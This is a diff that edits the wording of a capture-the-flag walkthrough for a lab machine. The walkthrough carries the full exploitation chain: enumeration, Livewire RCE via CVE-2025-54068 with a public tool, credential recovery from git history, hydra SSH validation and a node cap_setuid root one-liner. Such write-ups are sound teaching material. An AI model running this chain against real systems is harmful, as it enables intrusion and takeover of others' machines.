@@ -14,9 +14,9 @@ Virtual host fuzzing turns up a subdomain running a Laravel ticketing app built 
 
 ## Enumeration
 
-### Port Scanning
+### Port Enumeration
 
-A full TCP port scan is run first:
+A full TCP port scan comes first:
 
 ```bash
 $ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn automation.nyx
@@ -27,7 +27,7 @@ PORT   STATE SERVICE REASON
 MAC Address: 08:00:27:27:C4:E6 (Oracle VirtualBox virtual NIC)
 ```
 
-Two ports are found open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:
+Two ports come back open: **22 (SSH)** and **80 (HTTP)**. A version and script scan on both fills in the details:
 
 ```bash
 $ sudo nmap -p 22,80 -sCV automation.nyx
@@ -44,7 +44,6 @@ MAC Address: 08:00:27:27:C4:E6 (Oracle VirtualBox virtual NIC)
 Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-
 ### Web Enumeration
 
 The main page:
@@ -52,6 +51,7 @@ The main page:
 ```
 http://automation.nyx/
 ```
+
 <img src="../Images/automation/Pasted image 20260727235715.png"/>
 
 A content discovery scan against the main site:
@@ -68,7 +68,7 @@ index.html            [Status: 200, Size: 19996, Words: 3603, Lines: 511, Durati
                       [Status: 200, Size: 19996, Words: 3603, Lines: 511, Duration: 64ms]
 ```
 
-A virtual host scan is run as well, fuzzing the `Host` header instead of the path — this catches subdomains that wouldn't show up in any directory listing:
+The main site is just a static page, so a virtual host scan follows — fuzzing the `Host` header instead of the path catches subdomains that wouldn't show up in any directory listing:
 
 ```bash
 $ ffuf -u http://automation.nyx -H "Host: FUZZ.automation.nyx" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 18
@@ -84,6 +84,7 @@ tickets                [Status: 200, Size: 12126, Words: 1080, Lines: 227, Durat
 ```
 http://tickets.automation.nyx/
 ```
+
 <img src="../Images/automation/Pasted image 20260727235815.png"/>
 
 Reviewing the form's requests shows a `/livewire/update` endpoint — a signature of Laravel Livewire, a framework for building dynamic UIs without writing separate JavaScript:
@@ -95,13 +96,14 @@ Content-type: application/json
 X-Livewire:
 Cookie: XSRF-TOKEN=...; laravel-session=...
 ```
+
 <img src="../Images/automation/Pasted image 20260727235843.png"/>
 
 ## Initial Access
 
 ### RCE via CVE-2025-54068
 
-Livewire's version in use is vulnerable to a known CVE, with a public exploit tool available:
+The Livewire version in use is vulnerable to a known CVE, with a public exploit tool available:
 
 > **Exploit:** CVE-2025-54068 (`https://github.com/synacktiv/Livepyre`)
 
@@ -109,6 +111,7 @@ Livewire's version in use is vulnerable to a known CVE, with a public exploit to
 $ git clone https://github.com/synacktiv/Livepyre
 $ pip3 install -r requirements.txt
 ```
+
 ```bash
 $ python3 Livepyre.py -u http://tickets.automation.nyx
 [INFO] The remote livewire version is v3.6.2, the target is vulnerable.
@@ -155,7 +158,7 @@ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-The shell is upgraded to something usable:
+A quick pty upgrade makes the shell usable:
 
 ```bash
 python3 -c 'import pty; pty.spawn ("/bin/bash")'
@@ -172,9 +175,13 @@ www-data@automation:/var/www$ ls /home/alex/
 ls: cannot open directory '/home/alex/': Permission denied
 ```
 
+`alex`'s home is off-limits to `www-data`, so the way forward is to find something of `alex`'s that *is* readable.
+
 ## Lateral Movement
 
 ### Loot: An Exposed `.git` Directory
+
+Searching the whole filesystem for files owned by `alex` turns up a development copy of the app under `/opt`:
 
 ```bash
 www-data@automation:/var/www$ find / -user alex 2>/dev/null
@@ -207,6 +214,7 @@ www-data@automation:/var/www$ find / -user alex 2>/dev/null
 /opt/tickets-development/.git/ORIG_HEAD
 /opt/tickets-development/.git/hooks
 ```
+
 ```bash
 www-data@automation:/var/www$ ls -l /opt/tickets-development/.git
 total 52
@@ -226,7 +234,7 @@ drwxrwxr-x  4 alex alex 4096 Feb 22 15:22 refs
 
 > **Directory:** `/opt/tickets-development/.git`
 
-A development copy of the app has its `.git` directory sitting on disk and readable. Git normally refuses to operate on a repository it doesn't consider "safe" — owned by a different user than the one running the command — so it's copied out and explicitly marked as trusted before working with it:
+The `.git` directory is world-readable. Git normally refuses to operate on a repository owned by a different user than the one running the command (its "unsafe repository" protection), so the fix is to copy it somewhere writable and mark it explicitly trusted:
 
 ```bash
 www-data@automation:/var/www$ cp -r /opt/tickets-development/.git /tmp
@@ -234,7 +242,7 @@ www-data@automation:/var/www$ export HOME=/tmp
 www-data@automation:/var/www$ git config --global --add safe.directory /tmp
 ```
 
-The commit history is browsed for anything sensitive that might have been removed later:
+The history is short — two commits — and the initial one is worth checking out for anything dropped since:
 
 ```bash
 www-data@automation:/tmp$ git --no-pager log
@@ -251,6 +259,7 @@ Date:   Sun Feb 22 15:24:16 2026 +0000
     Initial commit with current files
 www-data@automation:/tmp$ git checkout 0c8fa0d1fea9643f7f731fb9c08c273f57388e38
 ```
+
 ```bash
 www-data@automation:/tmp$ ls -la
 total 24
@@ -262,7 +271,8 @@ drwxr-xr-x  8 www-data www-data 4096 Jul 27 21:41 .git
 -rw-------  1 www-data www-data   20 Jul 27 21:39 .lesshst
 www-data@automation:/tmp$ cat /tmp/.env
 ```
-```Plaintext
+
+```plaintext
 DB_CONNECTION=mysql
 DB_HOST=127.0.0.1
 DB_PORT=3306
@@ -271,13 +281,13 @@ DB_USERNAME=tickets
 DB_PASSWORD=24!#saDf!f2ar8sA#
 ```
 
-A `.env` file from an earlier commit holds a plaintext password:
+The commit before the MySQL-to-SQLite switch still carries a `.env` with a plaintext database password:
 
 > **Password:** `24!#saDf!f2ar8sA#`
 
 ### Shell as alex
 
-The password is validated against SSH:
+`hydra` validates the password against SSH:
 
 ```bash
 $ hydra -l alex -p '24!#saDf!f2ar8sA#' ssh://automation.nyx
@@ -291,15 +301,13 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-27 17:43:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-27 17:43:32
 ```
 
-It works — the same password used for the app is reused as `alex`'s system password:
+It works — the app's database password is reused as `alex`'s system password:
 
 > **Credentials:** `alex:24!#saDf!f2ar8sA#`
 
 ```bash
 $ ssh alex@automation.nyx
-```
-
-```bash
+alex@automation.nyx's password:
 alex@automation:~$ id
 uid=1000(alex) gid=1000(alex) groups=1000(alex)
 alex@automation:~$ ls -l /home/alex/
@@ -315,6 +323,8 @@ alex@automation:~$ cat /home/alex/user.txt
 
 ### `cap_setuid` on `node`
 
+A capability sweep of the filesystem shows `node` carrying something it has no business holding:
+
 ```bash
 alex@automation:~$ getcap -r /
 /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin,cap_sys_nice=ep
@@ -323,7 +333,7 @@ alex@automation:~$ getcap -r /
 /usr/bin/ping cap_net_raw=ep
 ```
 
-Linux capabilities let a binary hold specific privileged abilities without needing the full SUID-root treatment. `cap_setuid` in particular allows a process to change its own UID directly — if `node` carries that capability, a short script is enough to become root and spawn a shell that inherits it:
+Linux capabilities let a binary hold specific privileged abilities without needing the full SUID-root treatment. `cap_setuid` in particular allows a process to change its own UID directly — so with `node` carrying that capability, a short script is enough to become root and spawn a shell that inherits it:
 
 ```bash
 alex@automation:~$ node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0, 1, 2]})'
